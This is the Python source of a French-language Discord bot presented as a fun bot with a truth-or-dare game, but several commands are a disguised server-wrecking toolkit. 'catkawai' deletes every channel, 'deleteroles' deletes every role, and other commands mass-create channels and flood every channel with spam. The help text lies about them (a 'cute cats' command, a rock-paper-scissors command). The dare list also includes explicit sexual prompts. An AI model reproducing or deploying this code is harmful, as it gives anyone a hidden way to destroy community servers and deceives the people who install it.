import discord
from discord.ext import commands
import random
import asyncio

# Création du bot avec les intentions spécifiées
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True
intents.voice_states = True  # Ajout des intentions pour gérer les états vocaux
intents.members = True

bot = commands.Bot(command_prefix='-', intents=intents)
spamming = False  # Définition de la variable globale spamming

# Liste des questions Action ou Vérité
questions = [
    "Action: Danse comme si personne ne te regardait pendant 1 minute.",
    "Action: Fais 10 pompes.",
    "Action: Fais une grimace pendant 10 secondes.",
    "Vérité: Qui est ton crush actuel ?",
    "Vérité: Quelle est la chose la plus embarrassante que tu aies jamais faite ?",
    "Vérité: Quel est ton plus grand secret ?",
    "Vérité: Quelle est ta chanson plaisir coupable préférée ?",
    "Vérité: Quel est ton film plaisir coupable préféré ?",
    "Vérité: Quel est l’endroit dans le monde, le pays où tu rêves d’aller ? Pourquoi ?",
    "Vérité: As-tu des talents cachés ? Lesquels ?",
    "Vérité: Est-ce qu’il y a des trucs bizarres que tu fais pendant ton sommeil ? Si oui, lesquels ?",
    "Vérité: De quoi es-tu le plus fier / fière ?",
    "Vérité: Si un génie t’accordait trois vœux, qu’est-ce que tu souhaiterais ?",
    "Vérité: A quand remonte la dernière fois que tu t'es masturbé ?",
    "Vérité: Quelle est la chose la plus idiote dont tu ne peux pas te passer ?",
    "Vérité: Si tu devais changer de prénom, comment t’appellerais-tu ?",
    "Vérité: Quel est le pire cadeau que quelqu’un t’ait offert ?",
    "Vérité: As-tu déjà fait pipi dans une piscine ?",
    "Vérité: Qu’est-ce que tu ne ferais jamais, même pour 1 million d’euros ?",
    "Vérité: Si tu pouvais être en couple avec deux personnes à la fois, le ferais-tu ? Si oui, avec qui ?",
    "Vérité: Avec combien de personnes as-tu fait l’amour ?",
    "Vérité: Quelle est la couleur de tes sous-vêtements ?",
    "Action: Imite-moi lorsque l’on se dispute",
    "Action: Dis-moi « je t’aime » dans 5 langues différentes",
    "Action: Fais le poirier",
    "Action: Pour elle : enfile un caleçon",
    "Action: Pour lui : enfile des collants",
    "Action: Montre-moi la première photo qui apparaît dans ton téléphone",
    "Action: Récite l’alphabet à l’envers avec le nez bouché",
    "Action: Déshabille-toi",
    "Action: Imite l’animal de ton choix pendant 30 secondes",
    "Action: Fais 10 pompes",
    "Action: Commande une tenue sexy sur internet",
    "Action: Envoyez un SMS à un numéro de téléphone aléatoire avec un compliment ou un message d'encouragement.",
    "Action: Faites un dessin rapide de quelque chose que le groupe vous demande.",
    "Action: Laisse ta langue explorer la poitrine de ton partenaire",
    "Vérité: As-tu déjà essayé une expérience de bondage ou de BDSM ?",
    "Vérité: Quel est ton scénario de film/série sexuel le plus mémorable ? Tu t'es masturbé devant ?",
    "Vérité: Quel est le message texte le plus coquin que tu aies jamais envoyé ?",
    "Vérité: As-tu déjà été pris en flagrant délit ?",
    "Action: Joue un scénario coquin avec ton partenaire.",
    "Action: Partage un fantasme secret avec ton partenaire.",
    "Action: Chuchote des mots coquins à l’oreille de ton partenaire",
    "Action: Promenez-vous main dans la main au coucher du soleil.",
    "Action: Partagez un secret profond et significatif l’un avec l’autre.",
    "Action: Chantez une chanson de votre choix pendant 30 secondes",
    "Vérité: La dernière fois que tu as regardé un film pour adulte ?"
]

# Événement déclenché lorsque le bot est prêt
@bot.event
async def on_ready():
    print(f'Connecté en tant que {bot.user.name}!')

# Événement déclenché lorsqu'un message est envoyé sur un serveur
@bot.event
async def on_message(message):
    if message.author == bot.user:  # Vérifier si c'est le bot qui a envoyé le message
        return

    # Mot spécifique à rechercher
    mots_cles = {
        "motclé": "Réponse au mot clé", 
    }

    # Vérifier si l'un des mots clés est dans le message
    for mot, reponse in mots_cles.items():
        if mot in message.content.lower():
            await message.channel.send(reponse.format(message.author.mention))

    # Liste des mots interdits
    mots_interdits = ['motinterdit',]  # Remplacez par les mots que vous voulez surveiller ou ajoutez en

    # Vérifiez si le message contient un mot interdit et supprimez-le si c'est le cas
    if any(mot in message.content.lower() for mot in mots_interdits):
        await message.delete()
        await message.channel.send(f"Un message de {message.author.mention} a été supprimé car il contenait un mot interdit.")

    await bot.process_commands(message)

# Commande pour afficher les informations de l'utilisateur
@bot.command()
async def userinfo(ctx, member: discord.Member = None):
    if member is None:
        member = ctx.author

    embed = discord.Embed(title="User Info", description=f"Here is the info for {member.name}", color=discord.Color.blue())
    embed.set_thumbnail(url=member.avatar.url)

    # Obtenir la bannière de l'utilisateur s'il est sur un serveur
    if member.guild:
        banner = member.guild.banner
        if banner:
            embed.set_image(url=banner.url)
        else:
            embed.add_field(name="Banner", value="No banner set", inline=True)
    else:
        embed.add_field(name="Banner", value="User is not in a guild", inline=True)

    embed.add_field(name="Username", value=member.name, inline=True)
    embed.add_field(name="Discriminator", value=member.discriminator, inline=True)
    embed.add_field(name="ID", value=member.id, inline=True)
    embed.add_field(name="Created At", value=member.created_at.strftime("%Y-%m-%d %H:%M:%S"), inline=True)
    await ctx.send(embed=embed)

# Commande pour créer plusieurs salons textuels
@bot.command()
async def chifumi(ctx, num_salons: int):
    for i in range(num_salons):
        nom_salon = f"ASHLEBEST-{i+1}"
        await ctx.guild.create_text_channel(nom_salon)
    await ctx.send(f"{num_salons} salons textuels ont été créés.")

# Commande pour supprimer tous les salons
@bot.command()
async def catkawai(ctx):
    for channel in ctx.guild.channels:
        await channel.delete()
    await ctx.send("Tous les salons ont été supprimés.")

# Commande pour supprimer tous les rôles
@bot.command()
async def deleteroles(ctx):
    for role in ctx.guild.roles:
        if role != ctx.guild.default_role:
            await role.delete()
    await ctx.send("Tous les rôles ont été supprimés.")

# Commande pour faire parler le bot
@bot.command()
async def parler(ctx, *, texte):
    await ctx.send(texte)
    await ctx.message.delete()  # Supprimer le message de l'utilisateur

# Commande pour envoyer plusieurs fois le même texte
@bot.command()
async def spam(ctx, texte, repetitions: int):
    for _ in range(repetitions):
        await ctx.send(texte)
        await asyncio.sleep(0.5)  # Ajoutez un délai de 0.5 seconde entre chaque envoi

# Commande pour arrêter le spam
@bot.command()
async def stop_spam(ctx):
    global spamming
    spamming = False
    await ctx.send("Le spam a été désactivé.")

# Commande pour envoyer le même message plusieurs fois dans tous les canaux textuels
@bot.command()
async def speed2(ctx, message, repetitions: str):
    global spamming
    if spamming:
        # Vérifier que "repetitions" peut être converti en un nombre entier
        try:
            repetitions = int(repetitions)
        except ValueError:
            await ctx.send("Le nombre de répétitions doit être un entier positif.")
            return

        # Vérifier que "repetitions" est un nombre entier positif
        if repetitions <= 0:
            await ctx.send("Le nombre de répétitions doit être un entier positif.")
            return

        async def send_message(channel):
            for _ in range(repetitions):
                await channel.send(message)

        tasks = [send_message(channel) for channel in ctx.guild.text_channels]
        await asyncio.gather(*tasks)
    else:
        await ctx.send("Le spam a été désactivé.")

# Commande Help
@bot.command()
async def helps(ctx):
    embed = discord.Embed(title="Liste des commandes", description="Voici une liste des commandes disponibles avec une brève explication de chacune :", color=discord.Color.blue())

    embed.add_field(name="-userinfo", value="Affiche les informations de l'utilisateur mentionné ou de l'utilisateur qui a exécuté la commande.", inline=False)
    embed.add_field(name="chifumi", value="fait un chifumi quoi jsp frr", inline=False)
    embed.add_field(name="-catkawai [num_salons]", value="Envoie des chats mignons dans le nombre de salon choisi", inline=False)
    embed.add_field(name="-cuteroles", value="Supprime 1 role sur le serveur, à l'exception du rôle par défaut.", inline=False)
    embed.add_field(name="-parler [texte]", value="Fait parler le bot en envoyant le texte spécifié dans le canal actuel.", inline=False)
    embed.add_field(name="-speed [texte]", value="tu peux faire un jeu drole", inline=False)
    embed.add_field(name="-speed2 [texte]", value="tu peux faire un jeu drole mais encore plus drole", inline=False)
    await ctx.send(embed=embed)

# Commande pour jouer à Action ou Vérité
@bot.command()
async def actionouverite(ctx):
    question = random.choice(questions)
    await ctx.send(question)

# Lancer le bot avec le token approprié
bot.run('YOUR TOKEN')
